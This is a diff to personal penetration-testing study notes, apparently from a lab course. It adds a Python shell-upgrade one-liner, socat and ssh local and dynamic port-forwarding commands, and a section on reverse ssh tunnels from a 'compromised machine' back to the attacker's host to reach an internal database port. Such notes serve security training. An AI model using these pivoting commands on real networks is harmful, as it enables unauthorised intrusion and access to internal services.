@@ -227,6 +227,8 @@ Password Shit:
 
 
 PORT FORWARDING AND SSH TUNNELING
+    always:
+        python3 -c 'import pty;pty.spawn("/bin/bash")'
     Port Forwarding:
 
             socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
@@ -238,5 +240,15 @@ PORT FORWARDING AND SSH TUNNELING
             ssh -N -L 0.0.0.0:4455:172.16.200.217:445 database_admin@10.4.200.215
         check ports on listening machine:
             ss -ntplu
-        Dynamic Tunneling:
+    Dynamic Tunneling:
             ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+
+SSH Remote Port Forwarding:
+    on compromised machine ssh to our machine:
+        on our machine:
+            sudo systemctl start ssh
+        con compromised:
+        
+        python3 -c 'import pty;pty.spawn("/bin/bash")'
+        ssh -N -R 127.0.0.1:2345:10.4.200.215:5432 shaleph@192.168.45.193
+        
